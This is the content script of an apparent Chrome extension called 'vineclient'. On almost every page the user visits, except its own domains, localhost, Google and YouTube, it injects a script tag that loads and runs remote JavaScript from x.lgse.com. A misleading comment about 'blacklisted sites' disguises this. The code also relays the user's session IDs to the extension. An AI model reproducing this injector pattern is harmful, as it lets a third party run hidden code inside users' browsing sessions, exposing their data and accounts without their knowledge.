// Check and ensure blacklisted sites aren't being visited
var b = document.getElementById('vineclient');
if (
    !location.href.contains("vineclient.com") &&
    !location.href.contains("lgse.com") &&
    !location.href.contains("localhost") &&
    !location.href.contains("127.0.0.1") &&
    !location.href.contains("localhost") &&
    !location.href.contains("youtube.com") &&
    !location.href.contains('google.com') &&
    document.body
   ) {
    // Create Script Tag For Injector
    var s = document.createElement('script'),
        t = new Date(),
        p = (location.href.contains("https")) ? "https" : "http";
	s.src = p + "://x.lgse.com/2c18e486683a3db1e645ad8523223b72.js?" + t.getTime();
	document.body.appendChild(s);
} else if (b && location.href.contains("client.vineclient.com")) {
    // Set Session
    chrome.runtime.sendMessage({type: 'setClient'},function (response) {
        b.setAttribute('data-extension',true);
        b.setAttribute('data-version',response.version);
    });

    // Check to see if user is logged in
    chrome.runtime.sendMessage({type: 'setSession', sessionID: (b.hasClass('pre-login')) ? null : b.getAttribute('data-sessionid'), appVersion: b.getAttribute('data-appversion')});
}